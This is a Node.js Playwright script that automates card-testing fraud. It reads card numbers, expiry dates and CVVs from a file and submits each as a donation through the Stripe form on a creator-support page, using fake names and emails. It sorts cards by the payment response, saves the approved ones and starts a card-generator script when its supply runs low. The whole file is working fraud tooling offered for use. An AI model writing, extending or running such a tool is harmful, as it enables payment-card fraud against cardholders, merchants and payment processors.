const { chromium } = require('playwright');
const { faker } = require('@faker-js/faker');
const fs = require('fs');
const readline = require('readline');
const { spawn } = require('child_process');
const path = require('path');

// Function to simulate payment with no timeout limit (unlimited timeout)
async function simulatePayment(card, influencerUrl) {
    let result = { success: false, reason: 'Unknown error' };

    const randomUsername = faker.internet.username();
    const randomEmail = faker.internet.email();

    try {
        // Launch browser with headless mode set to false
        const browser = await chromium.launch({ headless: false });
        const page = await browser.newPage();

        // Set Playwright timeout to unlimited
        page.setDefaultTimeout(0); // Disable all timeouts in Playwright

        if (!influencerUrl.startsWith('https://')) {
            influencerUrl = `https://${influencerUrl}`;
        }

        await page.goto(influencerUrl);

        // Fill out the form and proceed with the payment
        await page.fill('input[placeholder="Name or @yoursocial"]', randomUsername);
        await page.click('button:has-text("Support")');
        await page.waitForTimeout(2000);
        await page.fill('input[placeholder="Email"]', randomEmail);
        await page.click('button:has-text("Pay")');
        await page.waitForTimeout(5000);

        const stripeFrame = await page.waitForSelector('iframe[name^="__privateStripeFrame"]');
        const frame = await stripeFrame.contentFrame();

        console.log(`Using card: ${card.number}, Expiry: ${card.expiry_month}/${card.expiry_year}, CVV: ${card.cvv}`);

        await frame.fill('input[name="cardnumber"]', card.number);
        await frame.fill('input[name="exp-date"]', `${card.expiry_month}/${card.expiry_year}`);
        await frame.fill('input[name="cvc"]', card.cvv);

        if (await frame.isVisible('input[name="postal"]')) {
            await frame.fill('input[name="postal"]', '100080');
        }

        await page.click('button:has-text("Pay with Card")');
        await page.waitForTimeout(15000);

        const bodyContent = await page.textContent('body');

        if (bodyContent.includes("Your card number is incorrect.")) {
            result = { success: false, reason: "Card number is incorrect" };
        } else if (bodyContent.includes("Your card has been declined") || bodyContent.includes("Your card was declined.")) {
            result = { success: false, reason: "Card was declined" };
        } else if (bodyContent.includes("We are unable to authenticate your payment method.") || bodyContent.includes("Authentication Failed")) {
            result = { success: false, reason: "Authentication failed or card declined" };
        } else if (bodyContent.includes("You bought") && bodyContent.includes("Thank you for supporting")) {
            result = { success: true, reason: "Payment successful" };
        }

        await browser.close();
    } catch (error) {
        console.error(`Error during payment processing: ${error.message}`);
        result = { success: false, reason: "Error during payment processing" };
    }
    return result;
}

// Function to process cards from the file
async function processCardsFromFile(filePath, influencerUrl) {
    let fileContent = fs.readFileSync(filePath, 'utf-8');
    let cards = fileContent.split('\n').map(line => line.trim()).filter(Boolean);

    const approvedCards = [];

    // Process each card
    for (const cardInfo of cards) {
        const [number, expiry_month, expiry_year, cvv] = cardInfo.split('|');
        const card = { number, expiry_month, expiry_year, cvv };

        try {
            const result = await simulatePayment(card, influencerUrl);
            const cardDetails = `[${card.number}]`;

            if (result.success) {
                console.log(`✅ ${cardDetails} Payment successful: ${result.reason}`);
                approvedCards.push(cardDetails);
            } else {
                console.log(`❌ ${cardDetails} Payment failed: ${result.reason}`);
            }

            // Remove the card from the file (i.e., mark it as processed)
            fileContent = fileContent.replace(`${cardInfo}\n`, ''); // Remove the processed card line
            fs.writeFileSync(filePath, fileContent, 'utf-8'); // Update the file after removing the card

        } catch (error) {
            console.log(`❌ Skipping card [${card.number}] due to error: ${error.message}`);
        }
    }

    // Save approved cards to a file
    if (approvedCards.length > 0) {
        fs.writeFileSync('approved_cards.txt', approvedCards.join('\n'), 'utf-8');
        console.log(`✅ Approved cards have been saved to 'approved_cards.txt'.`);
    } else {
        console.log('❌ No approved cards found.');
    }
}

// Function to check the card count and run card generator if needed
function checkCardCountAndGenerate(filePath) {
    const cardCount = fs.readFileSync(filePath, 'utf-8').split('\n').length;

    if (cardCount <= 50) {
        console.log("⚠️ Card count is low, starting card generation...");
        // Start the card generator Python script
        const generatorProcess = spawn('python3', [path.join(__dirname, 'cardgenerator.py')]);

        generatorProcess.stdout.on('data', (data) => {
            console.log(`🔄 Card Generator: ${data}`);
        });

        generatorProcess.stderr.on('data', (data) => {
            console.error(`❌ Card Generator Error: ${data}`);
        });

        generatorProcess.on('close', (code) => {
            console.log(`🔴 Card Generator exited with code ${code}`);
        });
    } else if (cardCount >= 100000) {
        console.log("✅ Card count has reached 100,000. Stopping card generation.");
        // If we need to stop the generator (e.g., if it was running before), we could send a kill signal here.
        // You may want to manage the card generation process better, such as using a process manager to stop it.
    }
}

// Ask the user for the URL and file path to `cards.txt`
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question('🔗 Enter the payment URL: ', (url) => {
    rl.question('📂 Enter the path to your cards.txt file (default is ./cards.txt): ', (filePath) => {
        filePath = filePath || './cards.txt'; // Default to './cards.txt'
        
        // Start checking card count and generating new cards if needed
        checkCardCountAndGenerate(filePath);

        processCardsFromFile(filePath, url)
            .then(() => {
                console.log("✅ Card processing completed.");
                rl.close();
            })
            .catch(err => {
                console.error("❌ Error during card processing:", err);
                rl.close();
            });
    });
});
